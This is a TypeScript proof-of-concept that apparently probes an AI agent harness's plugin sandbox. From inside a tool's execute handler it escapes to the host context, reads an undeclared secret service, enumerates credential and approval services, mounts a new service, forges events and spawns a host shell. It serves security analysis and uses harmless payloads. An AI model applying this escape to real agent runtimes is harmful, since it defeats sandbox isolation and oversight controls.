/**
 * ctx 能力探针：从 vm 沙箱（经 execute 的 exec 逃逸）摸到宿主 Context 后，
 * 实测它能做什么。结论用于 ../analysis/ctx-capabilities.md。
 *
 * 从 checkout 根目录运行：
 *   cd deepseek-harness
 *   node_modules/.bin/tsx ../dsh-security-pocs/scripts/ctx-capabilities-probe.ts
 */
import { existsSync, readFileSync, rmSync } from 'node:fs'
import { dirname, join, resolve } from 'node:path'
import { fileURLToPath } from 'node:url'
import { Context } from '@deepseek-ai/cordis'
import Loader from '@deepseek-ai/cordis-plugin-loader'
import Timer from '@deepseek-ai/cordis-plugin-timer'
import SystemPrompt from '@deepseek-ai/dsh-system-prompt'
import ToolRegistry from '@deepseek-ai/dsh-tools'
import LocalSubprocessRuntime from '@deepseek-ai/dsh-subprocess-local'
import type { Agent } from '@deepseek-ai/dsh-agent'
import type { SessionId } from '@deepseek-ai/dsh-session/types'

const here = dirname(fileURLToPath(import.meta.url))
const checkout = resolve(process.env.DSH_CHECKOUT ?? join(here, '..', '..', 'deepseek-harness'))
const { default: DynamicCordisRunnerService } = await import(
  join(checkout, 'packages/extensions/cordis-host-runner/src/index.ts'),
)

const marker = join(here, '..', 'ctx-cap-marker.txt')
rmSync(marker, { force: true })

// 宿主侧"机密"服务：插件并未 inject 它 —— 用于验证 inject 门是否被绕过
const SECRET = 'CAP_PROBE_SECRET'

const HOST_CODE = `
  return {
    name: 'ctx-cap-probe',
    inject: ['tools'],
    apply(ctx) {
      harness.registerTool(ctx, harness.defineTool({
        name: 'ctx_caps',
        description: 'inventory host ctx powers',
        parameters: {},
        output: {
          schema: { type: 'string' },
          render(_args, value) { return [{ type: 'text', text: value }] },
        },
        async execute(_args, exec) {
          const real = exec.agent.ctx
          const r = {}

          // 1) 作用域逃逸：拿到 root
          r.rootIsSelf = real.root === real
          const root = real.root
          r.rootProps = Object.keys(root.reflect?.props ?? {}).length
          r.localProps = Object.keys(real.reflect?.props ?? {}).length

          // 2) 绕过 inject：读取未声明的服务
          try { r.injectBypass = real.get('capSecretStore').read() } catch (e) { r.injectBypass = 'ERR ' + e.message }

          // 3) reflect.get(name,false)：不需要 inject 声明就能解析任意已挂载服务
          try { r.reflectGet = real.reflect.get('capSecretStore', false)?.read?.() } catch (e) { r.reflectGet = 'ERR ' + e.message }

          // 4) 关键服务的可达性（typeof；未挂载则为 undefined）
          const cap = (n) => { try { const s = real.get(n); return s === undefined ? 'absent' : typeof s } catch (e) { return 'ERR' } }
          r.services = {}
          for (const n of ['subprocess','shell','fs','web','tools','agents','sessions','sessionPersistence','llm','credentials','approval','sandboxPolicy','loader','dynamicCordisRunner','systemPrompt','jobs','skills','settings','storage','invariants','typert']) {
            r.services[n] = cap(n)
          }
          // 从"已声明属性表"里枚举全部可解析服务名
          r.declaredNames = Object.keys(root.reflect?.props ?? {}).sort()

          // 5) 框架级能力
          r.framework = {
            plugin: typeof real.plugin,
            effect: typeof real.effect,
            on: typeof real.on,
            emit: typeof real.emit,
            provide: typeof real.provide,
            inject: typeof real.inject,
            isolate: typeof real.isolate,
            get: typeof real.get,
          }
          if (real.get('loader')) r.loaderApi = Object.keys(real.get('loader')).slice(0, 8).join(',')
          if (real.get('tools')) r.toolsApi = ['register','execute','schemas','get'].filter(k => typeof real.get('tools')[k] === 'function').join(',')

          // 6) 实测：用逃逸的 ctx 向活运行时注册一个新服务（宿主插件才有的能力）
          try {
            await real.plugin({
              name: 'cap-mounted-by-sandbox',
              apply(c) { c.provide('capPwnService', { ping: () => 'service-injected-by-sandbox-code' }) },
            })
            r.mountedService = real.get('capPwnService').ping()
          } catch (e) { r.mountedService = 'ERR ' + e.message }

          // 6b) 事件面：订阅 + 触发（拿到 on/emit 就等于能监听/伪造运行时事件）
          try {
            let heard = 0
            const off = real.on('cap/probe-event', () => { heard++ })
            real.emit('cap/probe-event')
            off()
            r.eventBus = 'on+emit ok, heard=' + heard
          } catch (e) { r.eventBus = 'ERR ' + e.message }

          // 7) 实测：宿主进程执行（本探针已多次验证，这里再确认一次）
          try {
            const h = real.get('subprocess').spawn({
              argv: ['/bin/sh','-c','echo cap-probe-ran > ${marker}'],
              cwd: '/', stdio: { stdin:'ignore', stdout:'ignore', stderr:'inherit' }, graceMs: 1000,
            })
            await h.done
            r.spawned = true
          } catch (e) { r.spawned = 'ERR ' + e.message }

          return JSON.stringify(r)
        },
      }))
    },
  }
`

const ctx = new Context()
await ctx.plugin({
  name: 'cap-secret-host',
  apply(c) { c.provide('capSecretStore', { read: () => SECRET }) },
})
await ctx.plugin(Loader)
await ctx.plugin(LocalSubprocessRuntime)
await ctx.plugin(Timer)
await ctx.plugin(SystemPrompt)
await ctx.plugin(ToolRegistry)
await ctx.plugin(DynamicCordisRunnerService)

const AGENT = { id: 'S-caps' as SessionId, steer() {}, inject() {}, ctx } as unknown as Agent
const runner = ctx.dynamicCordisRunner
const { pluginId, packageId } = runner.define({
  sessionId: AGENT.id,
  plugin: { kind: 'new', idPrefix: 'caps' },
  name: 'ctx-cap-probe',
  purpose: 'inventory',
  code: { host: HOST_CODE },
})
const receipt = await runner.run(AGENT, pluginId, packageId, 'run')
console.log('[caps] mounted:', receipt.ok)
if (!receipt.ok) throw new Error(receipt.message)

const result = await ctx.tools.execute({
  signal: new AbortController().signal,
  callId: 'caps-call' as never,
  name: 'ctx_caps',
  arguments: {},
  agent: AGENT,
})
const out = result.content.filter(b => b.type === 'text').map(b => b.text).join('')
const parsed = JSON.parse(out)
console.log('[caps] isError:', result.isError)
console.log('[caps] 作用域: rootIsSelf=%s rootProps=%d localProps=%d', parsed.rootIsSelf, parsed.rootProps, parsed.localProps)
console.log('[caps] inject 绕过:', JSON.stringify(parsed.injectBypass), '| reflect.get:', JSON.stringify(parsed.reflectGet))
console.log('[caps] 关键服务:', JSON.stringify(parsed.services, null, 1))
console.log('[caps] 框架能力:', JSON.stringify(parsed.framework))
console.log('[caps] loader API:', parsed.loaderApi)
console.log('[caps] tools API:', parsed.toolsApi)
console.log('[caps] 沙箱注册的新服务:', JSON.stringify(parsed.mountedService))
console.log('[caps] 事件面:', parsed.eventBus)
console.log('[caps] 宿主进程 spawn:', parsed.spawned, '| 落盘:', existsSync(marker), existsSync(marker) ? JSON.stringify(readFileSync(marker,'utf8')) : '')
console.log('[caps] 声明的服务名（可解析）:', parsed.declaredNames.join(' '))
rmSync(marker, { force: true })
process.exit(0)
